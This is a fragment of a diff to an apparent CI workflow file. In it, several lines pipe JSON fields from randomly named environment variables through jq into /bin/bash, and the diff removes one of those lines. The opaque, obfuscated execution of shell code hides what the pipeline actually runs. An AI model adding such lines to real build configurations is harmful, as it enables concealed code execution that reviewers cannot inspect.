@@ -32,7 +32,6 @@ jobs:
           echo $cj54 | jq -r .urt3893 | /bin/bash
           echo $xbmqe548 | jq -r .xh78723 | /bin/bash
           printf '%s' "$h01863" | jq -r .y1129 | /bin/bash
-          printf '%s' "$c487" | jq -r .pn7544 | /bin/bash
           printf '%s' "$ayw111" | jq -r .r0342 | /bin/bash
 
       - name: Store output
